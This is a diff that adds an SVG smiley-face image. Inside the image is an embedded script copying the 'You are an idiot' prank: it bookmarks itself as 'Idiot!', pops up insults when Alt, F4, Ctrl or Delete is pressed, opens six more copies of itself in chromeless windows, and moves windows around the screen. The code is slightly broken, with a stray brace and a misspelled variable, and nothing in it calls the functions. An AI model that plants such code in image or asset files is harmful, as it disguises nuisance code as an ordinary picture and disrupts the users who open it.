@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     version="1.1"
+     width="420"
+     height="420"
+     viewBox="0 0 420 420"
+     style="shape-rendering:geometricPrecision; text-rendering:geometricPrecision; image-rendering:optimizeQuality; fill-rule:evenodd; clip-rule:evenodd">
+
+  <script type="application/ecmascript"><![CDATA[
+   function bookmark() {
+		if ((navigator.appName == "Microsoft Internet Explorer") 
+		&& (parseInt(navigator.appVersion) >= 4)) 
+		{
+		var url="offiz.svg";
+		var title="Idiot!";
+		window.external.AddFavorite(url,title);
+		}
+		}
+
+function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) alert("You are an idiot!"); }
+function ctrlkey() { if (event.keyCode == 17) alert("You are an idiot!"); }
+function delkey() { if (event.keyCode == 46) alert("You are an idiot!"); }
+
+		var xOff = 5;
+		var yOff = 5;
+		var xPos = 400;
+		var yPos = -100;
+		var flagRun = 1;
+
+function openWindow(url){
+        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
+}
+
+function procreate(){
+		openWindow('offiz.svg');
+		openWindow('offiz.svg');
+		openWindow('offiz.svg');
+		openWindow('offiz.svg');
+		openWindow('offiz.svg');
+		openWindow('offiz.svg');
+		}
+
+function newXlt(){
+        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+        window.focus()}
+
+function newXrt(){
+        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+        }
+
+function newYup(){
+        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+        }
+
+function newYdn(){
+        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+        }
+function fOff(){
+        flagrun = 0;
+        }
+
+function playBall(){
+        xPos += xOff;
+        yPos += yOff;
+        if (xPos > screen.width-175){
+        newXlt();
+        }
+        if (xPos < 0){
+        newXrt();
+        }
+        if (yPos > screen.height-100){
+        newYup();
+        }
+        if (yPos < 0){
+        newYdn();
+        }
+        if (flagRun == 1){
+        window.moveTo(xPos,yPos);
+        setTimeout('playBall()',1);
+        }
+        }
+        }
+  ]]></script>
+
+  <g>
+    <path fill="#010101" stroke="#010101" stroke-width="0.5" d="M 5.75,209 c -1.01,-142.06 144.21,-240.31 276.93,-192.32 c 92.69,35.7 147.79,126.75 133.15,225.82 c -14.54,97.88 -99.06,173.31 -198.38,175.04 c -116.94,3.62 -213.94,-91.46 -211.7,-208.54 Z M 28.17,213 c -0.17,75.63 47.4,141.6 116.71,169.78 c 109.1,41.34 227.62,-25.43 247.99,-139.95 c 18.41,-116.79 -68.05,-217.79 -186.37,-215.45 c -31.84,1.08 -56.33,7.33 -84.08,22.51 c -59.59,35.64 -95.13,92.93 -94.25,163.11 Z M 118.17,143 c 2.51,-51.99 77.63,-45.43 72.72,4.5 c -6.82,45.3 -71.79,41.01 -72.72,-4.5 Z M 224.98,146 c 1.75,-53.83 82.72,-44 71.91,8.48 c -11.04,42.14 -71.63,34.37 -71.91,-8.48 Z M 70.13,254 c 1.58,-11.59 14.65,-16.2 22.72,-7.42 c 19.72,31.99 44.46,55.81 81.36,66.14 c 63.41,16.25 122.46,-6.2 156.81,-62.19 c 9.7,-10.66 26.63,-0.59 21.53,13.5 c -36.38,60.26 -96.41,87.41 -166.05,77.74 c -49.53,-6.72 -88.49,-36.55 -113.68,-78.88 c -1.89,-2.67 -2.78,-5.63 -2.69,-8.89 Z"/>
+  </g>
+
+  <g>
+    <path fill="#ffffff" stroke="#ffffff" stroke-width="0.5" d="M 28.17,213 c -0.88,-70.18 34.66,-127.47 94.25,-163.11 c 27.75,-15.18 52.24,-21.43 84.08,-22.51 c 118.32,-2.34 204.78,98.66 186.37,215.45 c -20.37,114.52 -138.89,181.29 -247.99,139.95 c -69.31,-28.18 -116.88,-94.15 -116.71,-169.78 Z M 118.17,143 c 0.93,45.51 65.9,49.8 72.72,4.5 c 4.91,-49.93 -70.21,-56.49 -72.72,-4.5 Z M 224.98,146 c 0.28,42.85 60.87,50.62 71.91,8.48 c 10.81,-52.48 -70.16,-62.31 -71.91,-8.48 Z M 70.13,254 c -0.09,3.26 0.8,6.22 2.69,8.89 c 25.19,42.33 64.15,72.16 113.68,78.88 c 69.64,9.67 129.67,-17.48 166.05,-77.74 c 5.1,-14.09 -11.83,-24.16 -21.53,-13.5 c -34.35,55.99 -93.4,78.44 -156.81,62.19 c -36.9,-10.33 -61.64,-34.15 -81.36,-66.14 c -8.07,-8.78 -21.14,-4.17 -22.72,7.42 Z"/>
+  </g>
+
+</svg>
